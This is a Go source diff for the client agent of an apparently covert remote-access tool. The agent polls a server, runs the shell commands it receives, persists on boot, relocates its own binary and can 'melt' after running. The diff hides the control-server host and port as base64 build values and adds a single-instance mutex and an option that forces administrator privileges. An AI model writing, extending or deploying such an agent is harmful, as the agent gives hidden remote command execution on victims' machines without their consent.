@@ -3,7 +3,9 @@ package main
 import (
 	"bytes"
 	"context"
+	"crypto/sha256"
 	"encoding/base64"
+	"encoding/hex"
 	"encoding/json"
 	"errors"
 	"fmt"
@@ -19,6 +21,7 @@ import (
 	"os/user"
 	"path/filepath"
 	"runtime"
+	"strconv"
 	"strings"
 	"sync"
 	"syscall"
@@ -28,12 +31,17 @@ import (
 var buildVersion = "dev"
 
 var (
-	defaultServerHost           = "localhost"
-	defaultServerPort           = "3000"
-	defaultInstallPathEncoded   = ""
-	defaultEncryptionKeyEncoded = ""
-	defaultMeltAfterRun         = "false"
-	defaultStartupOnBoot        = "false"
+	defaultServerHostEncoded        = ""
+	defaultServerPortEncoded        = ""
+	defaultInstallPathEncoded       = ""
+	defaultEncryptionKeyEncoded     = ""
+	defaultMeltAfterRun             = "false"
+	defaultStartupOnBoot            = "false"
+	defaultMutexKeyEncoded          = ""
+	defaultForceAdminRequirement    = "false"
+	defaultPollIntervalOverrideMs   = ""
+	defaultMaxBackoffOverrideMs     = ""
+	defaultShellTimeoutOverrideSecs = ""
 )
 
 const (
@@ -142,6 +150,8 @@ type BuildPreferences struct {
 	InstallPath   string
 	MeltAfterRun  bool
 	StartupOnBoot bool
+	MutexKey      string
+	ForceAdmin    bool
 }
 
 func init() {
@@ -161,7 +171,31 @@ func main() {
 		InstallPath:   installPathPreference,
 		MeltAfterRun:  parseBool(defaultMeltAfterRun),
 		StartupOnBoot: parseBool(defaultStartupOnBoot),
+		MutexKey:      decodeBase64(defaultMutexKeyEncoded),
+		ForceAdmin:    parseBool(defaultForceAdminRequirement),
 	}
+
+	if err := enforcePrivilegeRequirement(preferences.ForceAdmin); err != nil {
+		logger.Fatalf("privilege requirement not satisfied: %v", err)
+	}
+
+	mutexGuard, err := acquireInstanceMutex(preferences.MutexKey)
+	if err != nil {
+		logger.Fatalf("failed to honor mutex preference: %v", err)
+	}
+	if mutexGuard != nil {
+		defer mutexGuard.Release()
+		description := "instance mutex guard"
+		if name := mutexGuard.Name(); name != "" {
+			description = fmt.Sprintf("instance mutex: %s", name)
+		}
+		if mutexGuard.Recovered() {
+			logger.Printf("recovered stale %s", description)
+		} else {
+			logger.Printf("acquired %s", description)
+		}
+	}
+
 	metadata := collectMetadata()
 
 	client := &http.Client{Timeout: 60 * time.Second}
@@ -502,7 +536,7 @@ func handleShellCommand(ctx context.Context, cmd Command) CommandResult {
 		}
 	}
 
-	timeout := defaultShellTimeout
+	timeout := fallbackShellTimeout()
 	if payload.TimeoutSeconds > 0 {
 		timeout = time.Duration(payload.TimeoutSeconds) * time.Second
 	}
@@ -578,14 +612,14 @@ func (a *Agent) collectMetrics() *AgentMetrics {
 
 func (a *Agent) pollInterval() time.Duration {
 	if a.config.PollIntervalMs <= 0 {
-		return defaultPollInterval
+		return fallbackPollInterval()
 	}
 	return time.Duration(a.config.PollIntervalMs) * time.Millisecond
 }
 
 func (a *Agent) maxBackoff() time.Duration {
 	if a.config.MaxBackoffMs <= 0 {
-		return defaultBackoff
+		return fallbackMaxBackoff()
 	}
 	return time.Duration(a.config.MaxBackoffMs) * time.Millisecond
 }
@@ -678,8 +712,8 @@ func collectMetadata() AgentMetadata {
 }
 
 func defaultServerURL() string {
-	host := strings.TrimSpace(defaultServerHost)
-	port := strings.TrimSpace(defaultServerPort)
+	host := strings.TrimSpace(fallback(decodeBase64(defaultServerHostEncoded), "localhost"))
+	port := strings.TrimSpace(fallback(decodeBase64(defaultServerPortEncoded), "3000"))
 
 	if host == "" {
 		host = "localhost"
@@ -722,6 +756,51 @@ func parseBool(value string) bool {
 	}
 }
 
+func fallbackPollInterval() time.Duration {
+	if duration := parsePositiveDurationMs(defaultPollIntervalOverrideMs); duration > 0 {
+		return duration
+	}
+	return defaultPollInterval
+}
+
+func fallbackMaxBackoff() time.Duration {
+	if duration := parsePositiveDurationMs(defaultMaxBackoffOverrideMs); duration > 0 {
+		return duration
+	}
+	return defaultBackoff
+}
+
+func fallbackShellTimeout() time.Duration {
+	if duration := parsePositiveDurationSeconds(defaultShellTimeoutOverrideSecs); duration > 0 {
+		return duration
+	}
+	return defaultShellTimeout
+}
+
+func parsePositiveDurationMs(raw string) time.Duration {
+	trimmed := strings.TrimSpace(raw)
+	if trimmed == "" {
+		return 0
+	}
+	value, err := strconv.Atoi(trimmed)
+	if err != nil || value <= 0 {
+		return 0
+	}
+	return time.Duration(value) * time.Millisecond
+}
+
+func parsePositiveDurationSeconds(raw string) time.Duration {
+	trimmed := strings.TrimSpace(raw)
+	if trimmed == "" {
+		return 0
+	}
+	value, err := strconv.Atoi(trimmed)
+	if err != nil || value <= 0 {
+		return 0
+	}
+	return time.Duration(value) * time.Second
+}
+
 func samePath(a, b string) bool {
 	aClean := filepath.Clean(a)
 	bClean := filepath.Clean(b)
@@ -761,6 +840,127 @@ func copyBinary(src, dst string) error {
 	}
 
 	return nil
+}
+
+type instanceLock struct {
+	file      *os.File
+	path      string
+	name      string
+	recovered bool
+}
+
+func (l *instanceLock) Release() {
+	if l.file != nil {
+		l.file.Close()
+	}
+	if l.path != "" {
+		os.Remove(l.path)
+	}
+}
+
+func (l *instanceLock) Name() string {
+	return l.name
+}
+
+func (l *instanceLock) Recovered() bool {
+	if l == nil {
+		return false
+	}
+	return l.recovered
+}
+
+func acquireInstanceMutex(rawKey string) (*instanceLock, error) {
+	key := strings.TrimSpace(rawKey)
+	if key == "" {
+		return nil, nil
+	}
+
+	normalized := strings.ToLower(key)
+	hashed := sha256.Sum256([]byte(normalized))
+	token := hex.EncodeToString(hashed[:16])
+	lockPath := filepath.Join(os.TempDir(), fmt.Sprintf("tenvy-%s.lock", token))
+
+	recovered := false
+	for attempt := 0; attempt < 2; attempt++ {
+		file, err := os.OpenFile(lockPath, os.O_CREATE|os.O_EXCL|os.O_RDWR, 0o600)
+		if err == nil {
+			if _, writeErr := file.WriteString(fmt.Sprintf("pid=%d\n", os.Getpid())); writeErr != nil {
+				// Best effort; ignore write errors to avoid failing startup.
+			}
+			return &instanceLock{file: file, path: lockPath, name: key, recovered: recovered}, nil
+		}
+
+		if !errors.Is(err, os.ErrExist) {
+			return nil, fmt.Errorf("create mutex %s: %w", key, err)
+		}
+
+		stale, staleErr := lockFileIsStale(lockPath)
+		if staleErr != nil {
+			return nil, fmt.Errorf("inspect mutex %s: %w", key, staleErr)
+		}
+		if !stale {
+			return nil, fmt.Errorf("mutex %s is already acquired", key)
+		}
+
+		if removeErr := os.Remove(lockPath); removeErr != nil && !os.IsNotExist(removeErr) {
+			return nil, fmt.Errorf("cleanup stale mutex %s: %w", key, removeErr)
+		}
+		recovered = true
+	}
+
+	return nil, fmt.Errorf("mutex %s is already acquired", key)
+}
+
+func lockFileIsStale(path string) (bool, error) {
+	data, err := os.ReadFile(path)
+	if err != nil {
+		if os.IsNotExist(err) {
+			return true, nil
+		}
+		return false, err
+	}
+
+	pid := parseLockPID(string(data))
+	if pid <= 0 {
+		return true, nil
+	}
+
+	alive, err := processExists(pid)
+	if err != nil {
+		return false, err
+	}
+
+	return !alive, nil
+}
+
+func parseLockPID(content string) int {
+	lines := strings.Split(content, "\n")
+	for _, line := range lines {
+		trimmed := strings.TrimSpace(line)
+		if trimmed == "" {
+			continue
+		}
+		if !strings.HasPrefix(trimmed, "pid=") {
+			continue
+		}
+		value := strings.TrimSpace(strings.TrimPrefix(trimmed, "pid="))
+		pid, err := strconv.Atoi(value)
+		if err != nil || pid <= 0 {
+			continue
+		}
+		return pid
+	}
+	return 0
+}
+
+func enforcePrivilegeRequirement(required bool) error {
+	if !required {
+		return nil
+	}
+	if currentUserIsElevated() {
+		return nil
+	}
+	return errors.New("administrator privileges are required")
 }
 
 func configureStartupPreference(target string) error {
